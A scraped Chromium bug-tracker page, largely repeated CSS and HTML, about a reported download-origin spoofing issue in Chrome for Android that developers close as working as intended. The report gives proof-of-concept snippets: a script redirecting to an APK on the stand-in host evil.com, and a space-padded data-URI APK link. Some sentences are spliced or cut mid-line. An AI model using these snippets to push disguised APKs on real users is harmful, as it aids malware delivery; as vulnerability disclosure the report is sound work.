Min pointed out, we do display the origin of the download, which is the data: URI and is accurate. Changing that adds questionable benefit to security, as the user is likely to open the download without visiting chrome://downloads, and further reporting a URI not of the download, but of the website might just confuse the user.<span class="line"><!---->3) Not displaying the origin of the website in chrome://downloads. As Min pointed out, we do display the origin of the download, which is the data: URI and is accurate. Changing that adds questionable benefit to security, as the user is likely to open the download without visiting chrome://downloads, and further reporting a URI not of the download, but of the website might just confuse the user.<!----></span><br><br>In light of this discussion, I am marking this bug as working as intended.<span class="line"><!---->In light of this discussion, I am marking this bug as working as intended.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>

        mr-launch-overview {

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

        <div class="target-project-dialog">
          <h3 class="medium-heading"><!----> issue</h3>
          <div class="input-grid">
            <label for="targetProjectInput">Target project:</label>
            <div>
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              <mr-autocomplete vocabularyname="project" for="targetProjectInput" role="listbox" id="chops-autocomplete-1"><!---->
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>
    <!----></mr-autocomplete>
            </div>
          </div>

          <mr-issue-page issueclosed=""><!---->
      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {

        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;

    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }

    color: var(--chops-link-color);
    text-decoration: none;

    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }

  }

    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */

  * accessibility because styles will not always line up with semantically

  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }
      </style>

    <mr-cue centered="" cueprefname="search_for_numbers" hidden=""></mr-cue>


          
      
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

        <div class="dialog-content">
          <slot></slot>
        </div>

        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          </chops-button>

          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

      ---<span class="line"><!---->---<!----></span><br><br>### Report description<span class="line"><!---->### Report description<!----></span><br><br><br>Insufficient policy enforcement in data URI block leads to incorrect security UI in Downloads<span class="line"><!---->Insufficient policy enforcement in data URI block leads to incorrect security UI in Downloads<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### Bug location<span class="line"><!---->### Bug location<!----></span><br><br><br>#### Which product or website have you found a vulnerability in?<span class="line"><!---->#### Which product or website have you found a vulnerability in?<!----></span><br><br>Google Chrome<span class="line"><!---->Google Chrome<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### The problem<span class="line"><!---->### The problem<!----></span><br><br><br>#### Please describe the technical details of the vulnerability<span class="line"><!---->#### Please describe the technical details of the vulnerability<!----></span><br><br>Hi team,<span class="line"><!---->Hi team,<!----></span><br><br>This is a re-submit of <span class="line"><!---->This is a re-submit of <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a>.<span class="line"><!---->.<!----></span><br><br>I will explain in detail what is the difference between #1305184 and #121259 according to the email tips from <span class="line"><!---->I will explain in detail what is the difference between #1305184 and #121259 according to the email tips from <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a>.<span class="line"><!---->.<!----></span><br><br><br><br>Reproduce steps:<span class="line"><!---->Reproduce steps:<!----></span><br><br>Visit <span class="line"><!---->Visit <!----></span>https://ybt01.github.io/poc/son.html<a class="undefined" target="_blank" href="https://ybt01.github.io/poc/son.html"><!---->https://ybt01.github.io/poc/son.html<!----></a> and click link on webpage or host the attached poc.html in your own server.<span class="line"><!----> and click link on webpage or host the attached poc.html in your own server.<!----></span><br><br><br><br>The differences:<span class="line"><!---->The differences:<!----></span><br><br>1)#121259 means an attacker could spoof a file download dialog on any domains like<span class="line"><!---->1)#121259 means an attacker could spoof a file download dialog on any domains like<!----></span> <span class="line"><!----> <!----></span>google.com<a class="undefined" target="_blank" href="https://google.com"><!---->google.com<!----></a>, chrome need add an origin tip to file download dialog, you can see the detail description of #725084 and #1194554.<span class="line"><!---->, chrome need add an origin tip to file download dialog, you can see the detail description of #725084 and #1194554.<!----></span><br><br>I just want to make the attack scenario more real, so I used window.open("<span class="line"><!---->I just want to make the attack scenario more real, so I used window.open("<!----></span>https://abc.xyz<a class="undefined" target="_blank" href="https://abc.xyz"><!---->https://abc.xyz<!----></a>")<span class="line"><!---->")<!----></span> in my <span class="line"><!----> in my <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a>'s PoC, the root cause of #1305184 has no relation with #121259.<span class="line"><!---->'s PoC, the root cause of #1305184 has no relation with #121259.<!----></span><br><br><br>2)The core problem is chrome doesn't allow navigate top frame to data URL under normal scenarios.<span class="line"><!---->2)The core problem is chrome doesn't allow navigate top frame to data URL under normal scenarios.<!----></span><br>For example:<span class="line"><!---->For example:<!----></span><br>```<span class="line"><!---->```<!----></span><br><a href="data:text/html,xxx">click me</a> //this will be blocked<span class="line"><!---->&lt;a href="data:text/html,xxx"&gt;click me&lt;/a&gt; //this will be blocked<!----></span><br>```<span class="line"><!---->```<!----></span><br>But chrome doesn't block the navigation when we set mime type of data URI to "application/vnd.android.package-archive application/gz ...", instead chrome think it is a file download request.<span class="line"><!---->But chrome doesn't block the navigation when we set mime type of data URI to "application/vnd.android.package-archive application/gz ...", instead chrome think it is a file download request.<!----></span><br><br>3)My <span class="line"><!---->3)My <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a> <span class="line"><!----> <!----></span>has the same principle with my previous fixed <span class="line"><!---->has the same principle with my previous fixed <!----></span>issues <span class="line"><!---->issues <!----></span>#1213350<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1213350" title="Security: Incorrect Security UI in downloads"><!---->#1213350<!----></a> and <span class="line"><!----> and <!----></span>#1157743<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1157743" title="Security: spoof download on any websites"><!---->#1157743<!----></a>.<span class="line"><!---->.<!----></span><br><br>#1213350: chrome show origin "about:srcdoc" instead of the real origin "<span class="line"><!---->#1213350: chrome show origin "about:srcdoc" instead of the real origin "<!----></span>http://evil.com<a class="undefined" target="_blank" href="http://evil.com"><!---->http://evil.com<!----></a>"<span class="line"><!---->"<!----></span><br>```<span class="line"><!---->```<!----></span><br><iframe srcdoc="<script>document.location='<span class="line"><!---->&lt;iframe srcdoc="&lt;script&gt;document.location='<!----></span>http://evil.com/1.apk<a class="undefined" target="_blank" href="http://evil.com/1.apk"><!---->http://evil.com/1.apk<!----></a>'<span class="line"><!---->'<!----></span></script>"></iframe><span class="line"><!---->&lt;/script&gt;"&gt;&lt;/iframe&gt;<!----></span><br><br>```<span class="line"><!---->```<!----></span><br><br>#1305184: chrome show origin "data:..." instead of the real origin "http:s//ybt01.github.io"<span class="line"><!---->#1305184: chrome show origin "data:..." instead of the real origin "http:s//ybt01.github.io"<!----></span><br>```<span class="line"><!---->```<!----></span><br><a id="a1" href="data:                                                      application/vnd.android.package-archive;base64,UEsDBBQACAgIAJdibEYXK8+ZngQAAHQPAAATAAQAQW5kcm9pZE1hbml>click me</a><span class="line"><!---->&lt;a id="a1" href="data:                                                      application/vnd.android.package-archive;base64,UEsDBBQACAgIAJdibEYXK8+ZngQAAHQPAAATAAQAQW5kcm9pZE1hbml&gt;click me&lt;/a&gt;<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>4)The patch is different:<span class="line"><!---->4)The patch is different:<!----></span><br><br>- #1305184 need block navigate top frame to data:application/vnd.android.package-archive, application/gz and the like.<span class="line"><!---->- #1305184 need block navigate top frame to data:application/vnd.android.package-archive, application/gz and the like.<!----></span><br>- Show the real origin "<span class="line"><!---->- Show the real origin "<!----></span>https://ybt01.github.io<a class="undefined" target="_blank" href="https://ybt01.github.io"><!---->https://ybt01.github.io<!----></a>"<span class="line"><!---->"<!----></span> instead "data:..." in chrome://downloads page, the patch location maybe at /chrome/browser/download/android/download_manager_service.cc <span class="line"><!----> instead "data:..." in chrome://downloads page, the patch location maybe at /chrome/browser/download/android/download_manager_service.cc <!----></span><br><br><br>#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so<span class="line"><!---->#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so<!----></span><br><br>remote attacker<span class="line"><!---->remote attacker<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### The cause<span class="line"><!---->### The cause<!----></span><br><br><br>#### What version of Chrome have you found the security issue in?<span class="line"><!---->#### What version of Chrome have you found the security issue in?<!----></span><br><br>101.0.4934.0+cannary+android<span class="line"><!---->101.0.4934.0+cannary+android<!----></span><br><br><br>#### Is the security issue related to a crash?<span class="line"><!---->#### Is the security issue related to a crash?<!----></span><br><br>No<span class="line"><!---->No<!----></span><br><br><br>#### Choose the type of vulnerability<span class="line"><!---->#### Choose the type of vulnerability<!----></span><br><br>Security UI Spoofing<span class="line"><!---->Security UI Spoofing<!----></span><br><br><br>#### How would you like to be publicly acknowledged for your report?<span           Comment 3<a class="comment-link" href="?id=1305698#c3">Comment 3<!----></a>

          
        by

          <a class="comment-link" href="?id=1305698#c10">Comment 10<!----></a>

        Hi @qinmin and @bookholt,<span class="line"><!---->Hi @qinmin and @bookholt,<!----></span><br><br>My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<span class="line"><!---->My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<!----></span><br>- application/vnd.android.package-archive (for apk)<span class="line"><!---->- application/vnd.android.package-archive (for apk)<!----></span><br>- application/vnd.microsoft.portable-executable (for exe)<span class="line"><!---->- application/vnd.microsoft.portable-executable (for exe)<!----></span><br>- application/octet-stream (for bin/dmg)<span class="line"><!---->- application/octet-stream (for bin/dmg)<!----></span><br>...<span class="line"><!---->...<!----></span><br><br>And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<span class="line"><!---->And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<!----></span><mr-comment-content></mr-comment-content>

        I am wondering whether this should be something safebrowsing should do instead of download. <span class="line"><!---->I am wondering whether this should be something safebrowsing should do instead of download. <!----></span><br>Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<!----></span><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<span class="line"><!---->If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<!----></span><br><br>I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<span class="line"><!---->I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<!----></span><br><br>As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<span class="line"><!---->As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<!----></span><mr-comment-content></mr-comment-content>

        For <span class="line"><!---->For <!----></span>comment#11<a class="undefined" target="_blank" href="#c11"><!---->comment#11<!----></a>:<span class="line"><!---->:<!----></span><br><br>Download already shows a dangerous warning for apk or exe download.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download.<!----></span><br>-------------------------------<span class="line"><!---->-------------------------------<!----></span><br>Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<span class="line"><!---->Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<!----></span><br><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<!----></span><br>-----------------------<span class="line"><!---->-----------------------<!----></span><br>For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<span class="line"><!---->For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<!----></span><mr-comment-content></mr-comment-content>

        Regarding #17, as I said, blocking data URI download doesn't make user safer:<span class="line"><!---->Regarding #17, as I said, blocking data URI download doesn't make user safer:<!----></span><br>1. most users don't go to download home to launch apk.<span class="line"><!---->1. most users don't go to download home to launch apk.<!----></span><br>2. And there is no need to use data URI to trick users.<span class="line"><!---->" that uses capitalized "i" instead of "l". And there is no need to use data URI to trick users.<!----></span><br><br>The dangerous download dialog already presents a warning to users.  And hopefully things like deep scanning or safe browsing can detect malicious apks in the future. So I don't feel like blocking web standards is the right solution.<span class="line"><!---->The dangerous download dialog already presents a warning to users.         Personally I think download scanning or download URL checking are much safer than blocking. Download scanning can prevent the use of similar URL cases above (so it can also handle non-data URL), and protects users who never uses download page or pays attention to download URLs.<span class="line"><!---->Personally I think download scanning or download URL checking are much safer than blocking. Download scanning can prevent the use of similar URL cases above (so it can also handle non-data URL), and protects users who never uses download page or pays attention to download URLs.<!----></span><br> <span class="line"><!----> <!----></span><br>That's why I think this should be done in safe browsing rather than download. Another thing we could do is to warn user about data URL and blob URL in dangerous download dialog that they cannot be trusted, so users don't rely on download homes can know about the security risk<span class="line"><!---->That's why I think this should be done in safe browsing rather than download. Another thing we could do is to warn user about data URL and blob URL in dangerous download dialog that they cannot be trusted, so users don't rely on download homes can know about the security risk<!----></span><mr-comment-content></mr-comment-content>
